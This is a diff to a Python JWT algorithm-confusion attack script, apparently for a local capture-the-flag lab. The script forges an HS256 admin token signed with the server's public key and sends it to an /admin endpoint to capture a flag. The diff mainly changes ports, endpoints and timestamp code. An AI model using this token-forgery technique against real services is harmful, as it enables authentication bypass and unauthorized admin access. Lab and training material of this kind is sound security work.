@@ -23,7 +23,7 @@ DESCRIPTION:
   the public key becomes both the signing key and the verification key.
 
 USAGE:
-    python alg_confusion.py --target http://localhost:5000
+    python alg_confusion.py --target http://localhost:5001
 
 OUTCOME:
     Retrieves FLAG{jwt_bypass_success} from /admin
@@ -113,7 +113,7 @@ def forge_hs256_with_public_key(public_key_pem: bytes, payload: dict) -> str:
     return forged_token
 
 
-def run_attack(target: str) -> bool:
+def run_attack(target: str, endpoint: str, set_claims: list) -> bool:
     """
     Full end-to-end RS256→HS256 confusion attack:
       1. Fetch public key from target
@@ -121,7 +121,7 @@ def run_attack(target: str) -> bool:
       3. Submit to /admin endpoint
 
     Args:
-        target: Base URL (e.g., http://localhost:5000)
+        target: Base URL (e.g., http://localhost:5001)
 
     Returns:
         True if flag was captured
@@ -138,14 +138,14 @@ def run_attack(target: str) -> bool:
     # ── Phase 2: Build and forge admin payload
     print_info("\nStep 2: Forging admin JWT (alg=HS256, secret=public_key)...")
 
-    from datetime import datetime, timedelta
-    now = datetime.utcnow()
+    import time
+    now = int(time.time())
 
     forged_payload = {
         "sub":  "hacker",
         "role": "admin",
-        "iat":  int(now.timestamp()),
-        "exp":  int((now + timedelta(hours=1)).timestamp()),
+        "iat":  now,
+        "exp":  now + 3600,
         "iss":  "jwt-lab",
     }
 
@@ -159,7 +159,7 @@ def run_attack(target: str) -> bool:
     print_info("\nStep 3: Sending forged token to /admin ...")
     try:
         resp = requests.get(
-            f"{target}/admin",
+            endpoint,
             headers={"Authorization": f"Bearer {forged_token}"},
             timeout=5,
         )
@@ -189,13 +189,13 @@ def main():
         epilog="""
 Examples:
   python alg_confusion.py
-  python alg_confusion.py --target http://localhost:5000
+  python alg_confusion.py --target http://localhost:5001
         """,
     )
-    parser.add_argument("--target", default="http://localhost:5000", help="API base URL")
+    parser.add_argument("--target", default="http://localhost:5001", help="API base URL")
 
     args = parser.parse_args()
-    success = run_attack(args.target)
+    success = run_attack(args.target, "http://localhost:5001/admin/vulnerable", [])
     sys.exit(0 if success else 1)
 
 
